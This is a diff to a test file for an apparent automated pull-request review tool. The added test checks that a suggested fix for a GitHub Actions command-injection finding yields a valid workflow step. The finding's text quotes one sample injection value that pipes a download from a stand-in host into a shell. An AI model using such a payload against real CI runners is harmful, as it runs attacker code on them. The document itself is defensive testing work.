@@ -3,6 +3,7 @@ import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "nod
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import type { Finding } from "@omniralph/shared";
+import { parse as parseYaml } from "yaml";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { completes, dedupeFindings } from "./dedupe.js";
 import { parseDiff } from "./diff.js";
@@ -17,7 +18,7 @@ import {
   workflowEnvAt,
 } from "./selfContained.js";
 
-// mcm/omniralph-sandbox#1 (TOOL-56 live check): a new "Publish coverage summary"
+// mcm/omniralph-sandbox#1 (TOOL-56 live check; #2 at 9fda7a9 has the same base, head and diff): a new "Publish coverage summary"
 // step (lines 90-94, no `env:`) expands the PR title in `run:` (93) and reads a
 // coverage-summary.json nothing produces (94); a new upload step pins a tag (97).
 const fixture = (name: string) =>
@@ -327,5 +328,47 @@ describe("runReview on mcm/omniralph-sandbox#1", () => {
     const { result } = await review([widened, { ...coverage, body: stripCrossReferences(coverage).body }]);
     expect(result.findings[0]).toEqual(widened);
     expect(apply(HEAD, result.findings[0]!)).toContain("PR_TITLE: ${{ github.event.pull_request.title }}");
+  });
+
+  it("fits the live #2 whole-step suggestion anchored at 92-94 to the step at 90-94", async () => {
+    // mcm/omniralph-sandbox#2 (TOOL-59): the suggestion is the complete step,
+    // but the comment was anchored to `run:`..`node` only.
+    const live: Finding = {
+      path: PATH,
+      startLine: 92,
+      endLine: 94,
+      severity: "high",
+      category: "security",
+      title: "Untrusted PR title expanded directly in run script (command injection)",
+      body: '`${{ github.event.pull_request.title }}` is pasted into the shell script before the shell runs. A PR title containing `"; curl evil | sh; echo "` runs arbitrary commands on the runner. The step runs on `pull_request` events, including ones from forks. Pass the title through `env:` and quote the variable.',
+      suggestion: FIXED_STEP.replace("${PR_TITLE}", "$PR_TITLE"),
+      confidence: 0.95,
+    };
+    const liveCoverage: Finding = { ...coverage, startLine: 94, endLine: 94, body: stripCrossReferences(coverage).body };
+    const { result } = await review([live, liveCoverage, pinning]);
+
+    const inj = result.findings.find((f) => f.category === "security" && f.startLine < 97)!;
+    expect(inj).toMatchObject({ startLine: 90, endLine: 94, suggestion: live.suggestion });
+
+    // Applying it ("Commit suggestion") gives one valid step with the env mapping.
+    const fixed = apply(HEAD, inj);
+    expect(fixed.match(/- name: Publish coverage summary/g)).toHaveLength(1);
+    expect(fixed.match(/if: github\.event_name == 'pull_request'\n/g)).toHaveLength(1);
+    const workflow = parseYaml(fixed) as {
+      jobs: Record<string, { steps: { name?: string; if?: string; env?: Record<string, string>; run?: string; uses?: string }[] }>;
+    };
+    const step = Object.values(workflow.jobs)
+      .flatMap((job) => job.steps)
+      .find((s) => s.name === "Publish coverage summary")!;
+    expect(step).toEqual({
+      name: "Publish coverage summary",
+      if: "github.event_name == 'pull_request'",
+      env: { PR_TITLE: "${{ github.event.pull_request.title }}" },
+      run: expect.stringContaining('echo "### Coverage for: $PR_TITLE"'),
+    });
+    // No step is left with only `name`/`if` (GitHub rejects a step without `run` or `uses`).
+    for (const s of Object.values(workflow.jobs).flatMap((job) => job.steps)) {
+      expect(s.run ?? s.uses).toBeDefined();
+    }
   });
 });
